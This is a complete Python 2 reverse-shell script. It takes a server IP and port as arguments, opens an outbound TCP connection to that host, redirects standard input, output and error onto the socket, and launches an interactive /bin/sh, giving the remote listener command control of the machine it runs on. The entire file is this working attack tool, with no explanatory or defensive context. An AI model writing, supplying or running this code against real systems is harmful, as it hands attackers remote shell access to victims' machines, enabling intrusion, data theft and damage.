#!/usr/bin/python

import sys, socket, subprocess, os

def usage(name):
    print 'python reverse shell'
    print 'Usage: %s <server_ip> <server_host>' % name

def main():
    if len(sys.argv) < 3:
        usage(sys.argv[0])
        sys.exit()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((sys.argv[1], int(sys.argv[2])))
        print 'connect success'
    except:
        print 'connect failed'
        s.close()
        sys.exit()

    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    p=subprocess.call(["/bin/sh","-i"])

    s.close()

if __name__ == '__main__':
    main()
